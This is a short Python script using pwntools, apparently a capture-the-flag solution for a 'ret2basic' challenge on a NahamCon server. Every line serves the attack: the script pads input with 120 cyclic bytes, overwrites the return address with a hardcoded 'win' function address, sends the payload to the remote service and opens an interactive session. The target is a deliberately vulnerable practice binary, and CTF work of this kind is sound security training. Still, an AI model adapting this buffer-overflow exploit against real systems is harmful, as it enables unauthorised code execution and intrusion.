import pwn

pwn.context.terminal = ["konsole", "-e"]

elf = pwn.ELF("ret2basic")
#p = elf.process()
p = pwn.remote("challenge.nahamcon.com", 30413)

junk = pwn.cyclic(120)
win = pwn.p64(0x0000000000401215)

payload = [
    junk,
    win
]

payload = b"".join(payload)

p.recvuntil("this?: ")
p.sendline(payload)
p.interactive()
